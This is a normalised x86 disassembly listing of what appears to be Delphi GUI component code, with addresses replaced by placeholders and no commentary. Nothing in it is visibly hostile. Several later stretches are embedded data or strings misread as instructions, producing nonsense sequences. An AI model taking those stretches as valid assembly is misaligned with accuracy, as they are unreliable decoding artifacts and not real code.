mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4764d7
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
call sub_418cc8
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4188a0
mov edi eax
mov eax [ edi + 0x68 ]
mov edx [ eax ]
call [ edx + 0x5c ]
inc esi
dec ebx
jne r-xdata
sub_4764d7
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa4 ]
cdq
idiv [ rw-data ]
mov ebx eax
test ebx ebx
jle r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_46e2e4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
mov edx 0x1
call sub_4749b4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47655f
lea eax [ ebp - 0x10 ]
call sub_404164
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
dec ebx
jne r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub_476568
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x6c ]
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_474bd4
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov [ ebx + 0x80 ] 0x1
sub_4765b8
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov cl 0x1
xor edx edx
mov eax edi
call sub_474060
mov eax [ ebp + 0x8 ]
mov [ edi + 0x68 ] eax
mov [ edi + 0x6c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_476604
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push j_sub_40395c#4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x6c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_476778
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov eax [ eax + 0x88 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
test ebx ebx
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
call sub_476568
mov edx [ eax ]
call [ edx + 0x34 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x68 ] eax
mov edx ebx
call sub_472eac
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x68 ]
mov [ eax + 0x70 ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x6c ]
mov esi [ ebx + 0x98 ]
test esi esi
jle r-xdata
lea eax [ ebp - 0x8 ]
call sub_40d490
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov eax [ eax + 0xac ]
mov edx [ ebp - 0xc ]
call sub_418bdc
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx esi
mov eax [ ebx + 0xac ]
call sub_4749b4
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
call sub_476568
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0xc ]
call sub_418c78
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx [ eax + 0x94 ]
mov eax [ ebp - 0x8 ]
call sub_4738a8
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x58 ]
lea eax [ ebp - 0xc ]
call sub_40d490
jmp r-xdata
sub_476778
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_472628
mov [ edi + 0xb8 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_4767bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_476805
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
mov edx [ eax ]
call [ edx + 0x3c ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x68 ]
mov eax [ ebx + 0xb8 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xb8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov edx eax
mov eax ebx
call sub_472e98
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
sub_47680a
mov eax [ ebp - 0x4 ]
mov [ eax + 0xf ] 0x1
call sub_403b44
call sub_403b98
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x68 ]
mov eax [ ebx + 0xb8 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xb8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov edx eax
mov eax ebx
call sub_472e98
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
sub_476884
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4742a8
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov edx [ eax + 0xb8 ]
test edx edx
je r-xdata
lea eax [ ebx + 0x68 ]
call sub_40d490
mov esi edx
mov eax [ esi + 0xac ]
test eax eax
je r-xdata
mov eax esi
call sub_476568
test eax eax
je r-xdata
mov edx ebx
call sub_418c78
mov eax esi
call sub_476568
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_4768d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_476a4a
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_40395c
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push j_sub_40395c#6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xb8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476a51
lea eax [ ebp - 0x8 ]
call sub_404164
retn
sub_47695e
add eax [ eax ]
add [ eax ] al
sbb [ edx + 0x697a0046 ] ch
inc edi
add [ eax + 0x69ac0046 ] al
inc edi
add [ eax ] ah
mov al [ 0x69c50046 ]
inc edi
add [ ecx - 0x3ba743d ] cl
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xb8 ]
mov ecx ebx
mov edx [ ebp - 0x4 ]
call sub_475e20
mov eax [ ebx + 0xc ]
add eax 0xffffd8bb
sub eax 0x2
jae r-xdata
call sub_403b98
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x58 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476a51
lea eax [ ebp - 0x8 ]
call sub_404164
retn
sub_4769c5
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x68 ]
mov edx [ edx + 0xb8 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
xchg edx eax
call sub_475e20
call sub_403b98
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476a51
lea eax [ ebp - 0x8 ]
call sub_404164
retn
sub_476a64
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ r-xdata ]
push eax
mov ecx esi
xor edx edx
mov eax edi
call sub_419918
mov [ edi + 0x1c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_476ac8
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_476de5
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
call sub_404164
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov eax ebx
call sub_408218
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476dec
lea eax [ ebp - 0x28 ]
mov edx 0x5
call sub_404188
lea eax [ ebp - 0x10 ]
call sub_404164
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_476ff4
mov [ ebp - 0x14 ] eax
xor ecx ecx
push ebp
push sub_476dbb
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x14 ]
add eax 0x10
mov edx ebx
call sub_4041b8
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x1c ] edx
mov eax [ ebp - 0x14 ]
add eax 0x20
mov edx [ ebp - 0x10 ]
call sub_4041b8
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29 ] 0x0
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_404424
mov ecx eax
mov edx 0x1
mov eax ebx
call sub_404684
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x10 ]
call sub_408218
mov [ ebp - 0x9 ] al
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_404424
mov edx eax
inc edx
mov ecx 0x7fffffff
mov eax ebx
call sub_404684
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_404424
mov ecx eax
inc ecx
mov edx 0x1
mov eax ebx
call sub_404684
mov eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0xc ]
call sub_40434c
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
lea eax [ ebp - 0x1c ]
call sub_404470
mov edx [ ebp - 0x1c ]
pop eax
call sub_408218
mov [ ebp - 0x9 ] al
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_404424
mov edx eax
add edx 0x2
mov ecx 0x7fffffff
mov eax ebx
call sub_404684
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ eax + 0xc ] 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor ecx ecx
push ebp
push j_sub_40395c#8
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0x28 ]
cmp bl 0x20
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
lea eax [ ebp - 0x28 ]
mov edx ebx
call sub_40434c
mov ecx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_47483c
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx r-xdata
mov eax [ ebp - 0x10 ]
call sub_474758
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x14 ]
call sub_4770b0
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
call sub_473904
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403368
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
call sub_473904
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x58 ]
sub_476dfb
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffef8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_476ebf
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_41920c
mov [ esi + 0xc ] 0x20
mov [ esi + 0x19 ] 0x1
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x8 ]
call sub_408350
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x108 ]
mov eax [ esi ]
call sub_4032b8
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_4043c8
mov edx [ ebp - 0x8 ]
lea eax [ esi + 0x1c ]
pop ecx
call sub_404470
mov [ esi + 0x28 ] 0x20
mov [ esi + 0x29 ] 0x1
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_470538
mov [ esi + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ esi + 0x34 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476ec6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404188
retn
add esp 0xfffffff0
call sub_4036b4
sub_476ee4
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
lea eax [ esi + 0x34 ]
call sub_40d490
lea eax [ esi + 0x30 ]
call sub_40d490
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419244
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_476f30
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_476fad
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_4192d8
mov eax [ ebx + 0x4 ]
call sub_476abc
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403564
push [ ebp - 0x4 ]
push r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_4044e4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476fb4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404188
retn
sub_476fbf
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
lea eax [ ebx + 0x1c ]
mov edx esi
call sub_4041b8
mov edx esi
mov eax ebx
call sub_4193b8
pop esi
pop ebx
retn
sub_476ff4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403338
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ esi + 0x8 ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_470538
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ esi + 0x18 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_477058
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
lea eax [ esi + 0x14 ]
call sub_40d490
lea eax [ esi + 0x18 ]
call sub_40d490
lea eax [ esi + 0x8 ]
call sub_40d490
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403358
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_4770b0
push ebx
mov ebx eax
mov [ ebx + 0xc ] 0x0
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x9c ]
mov edx [ ebx + 0x14 ]
call sub_4709d8
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x68 ]
mov edx [ ebx + 0x14 ]
call sub_4738a8
pop ebx
retn
sub_4770e0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_477105
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47710c
retn
sub_4778f8
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0022 ] al
outsb
push ebx
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100025 ] al
outsb
je r-xdata
inc ebx
cmp [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f1000
push ebp
inc edi
add [ eax + 0x1 ] cl
add bh bh
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0026 ] al
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x756f7247
jo r-xdata
inc ecx
jae r-xdata
sub al 0x76
inc edi
inc esp
jb r-xdata
imul esi [ ebx + 0x74 ] 0x4777654e
jb r-xdata
imul esp [ ebx + 0x6c ] 0x4775ac65
add [ eax ] bh
add [ eax ] eax
push 0x4c6b6365
imul esi [ ebx + 0x74 ] 0x756f7247
jo r-xdata
add [ eax ] al
and [ 0x6e4f1000 ] 0x43
dec esi
outsd
inc eax
je r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
arpl [ gs : edi + eax * 2 + 0x72 ] si
add [ eax + 0x1 ] dl
add bh bh
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0027 ] al
outsb
dec esp
inc ecx
add ah bh
jne r-xdata
jb r-xdata
add [ eax ] ch
add [ eax ] eax
[ eax ]
jae r-xdata
ja r-xdata
[ eax + 0x1 ]
jo r-xdata
mov al [ 0x58004774 ]
add [ eax ] eax
[ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
push es
dec edi
outsb
push eax
outsd
jae r-xdata
add [ eax ] al
sub [ esi ] 0x0
or al 0x4f
jb r-xdata
add [ eax ] al
call [ eax ]
movsd [ edi ] [ esi ]
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e002b ] al
jbe r-xdata
cld
jae r-xdata
mov edx 0x1
call sub_4084c8
mov ebx eax
lea eax [ ebp - 0xc ]
mov ecx 0x2
mov edx 0x1
call sub_4046c4
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0x2
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404684
mov eax [ ebp - 0x14 ]
mov edx 0x1
call sub_4084c8
mov esi eax
lea eax [ ebp - 0xc ]
mov ecx 0x2
mov edx 0x1
call sub_4046c4
lea eax [ ebp - 0x18 ]
push eax
mov ecx 0x2
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404684
mov eax [ ebp - 0x18 ]
mov edx 0x1
call sub_4084c8
mov edi eax
lea eax [ ebp - 0xc ]
mov ecx 0x2
mov edx 0x1
call sub_4046c4
push 0x0
mov ecx edi
mov edx esi
mov eax ebx
call sub_409968
fstp [ ebp - 0x8 ]
fwait
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
call sub_408250
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0xc ]
call sub_4041fc
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
call sub_408068
mov eax [ ebp - 0x20 ]
mov edx r-xdata
call sub_404570
jne r-xdata
nop
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
xor eax eax
push ebp
push sub_477c79
push [ fs : eax ]
outsb
dec ecx
dec eax
popad
jbe r-xdata
xor al 0x73
inc edi
add [ eax - 0x7f00ffff ] al
add [ eax ] eax
inc [ ecx ]
push [ eax + 0x1 ]
add bh bh
jo r-xdata
js r-xdata
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_4041fc
mov eax [ ebp - 0xc ]
call sub_404424
test eax eax
jle r-xdata
add [ edi + edi * 8 + 0x30 ] ah
inc ebx
push 0xa06b6365
je r-xdata
imul esp [ ebp + 0x77 ] 0x6d726f46
popad
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477c80
lea eax [ ebp - 0x20 ]
mov edx 0x6
call sub_404188
retn
call sub_46de88
fadd [ ebp - 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x2
mov edx 0x1
jb r-xdata
outsb
pop eax
dec eax
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002c ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
push es
dec edi
dec esi
ja r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002d ] al
outsb
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0900
xor ecx ecx
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002f ] al
outsd
jne r-xdata
arpl [ edi + eax * 2 + 0x72 ] si
jbe r-xdata
jbe r-xdata
add [ eax + 0x1 ] ah
add bh bh
pushad
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0028 ] al
outsb
push ebx
insb
outsb
dec ecx
dec eax
popad
jbe r-xdata
imul esp [ eax - 0x77ffb88c ] 0x1
add bh bh
mov [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ ebx ] cl
dec edi
add [ eax + 0x1 ] bh
add bh bh
mov eax [ ebp - 0xc ]
call sub_404684
mov eax [ ebp - 0x10 ]
add [ eax ] al
add [ edx + 0x1 ] bh
push eax
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
add [ eax ] eax
inc [ eax + 0x1ff0001 ]
add [ eax + 0x1 ] dh
je r-xdata
add [ eax + 0x1 ] ch
add bh bh
push 0x1ff0001
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002a ] al
outsb
pop eax
dec edi
jbe r-xdata
sub_47791e
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0023 ] al
outsb
dec esi
js r-xdata
or al 0x4f
inc ecx
jb r-xdata
sub al 0x76
inc edi
inc esp
jb r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x756f7247
jo r-xdata
imul esp [ ebx + 0x6c ] 0x47744065
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0024 ] al
outsb
push eax
jb r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
arpl [ gs : edi + eax * 2 + 0x72 ] si
add [ eax + 0x1 ] dl
add bh bh
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0027 ] al
outsb
dec esp
jbe r-xdata
jae r-xdata
ja r-xdata
[ eax + 0x1 ]
inc ecx
add ah bh
jo r-xdata
mov al [ 0x58004774 ]
add [ eax ] eax
[ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
